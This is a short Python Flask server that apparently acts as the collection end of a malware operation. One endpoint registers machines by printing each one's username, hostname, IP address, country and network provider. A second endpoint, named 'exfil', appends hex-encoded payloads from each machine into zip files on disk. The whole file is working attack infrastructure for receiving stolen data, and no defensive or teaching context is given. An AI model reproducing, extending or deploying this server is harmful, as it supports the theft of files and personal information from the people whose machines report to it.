from flask import Flask, request

app = Flask(__name__)

def run_flask_app():
    app.run(debug=True)


@app.post("/new_machine")
def new_machine():
    data = request.get_json()
    
    output_string = (
    f"\nUsername:\t{data['user']}\n"
    f"Hostname:\t{data['host']}\n"
    f"ID:\t\t{data['id']}\n"
    f"IP:\t\t{data['ip']}\n"
    f"Country:\t{data['country']}\n"
    f"Region:\t\t{data['region']}\n"
    f"Provider:\t{data['provider']}\n"
    )
    
    print(output_string)

    return {"Created":True}, 201

@app.post("/exfil")
def exfil():
    data=request.get_json()
    id = data["id"]
    with open(f"./temp/{id}.zip", "ab") as output:
        output.write(bytes.fromhex(data["payload"]))
        return {"created":True}, 200
    
if __name__=="__main__":
    run_flask_app()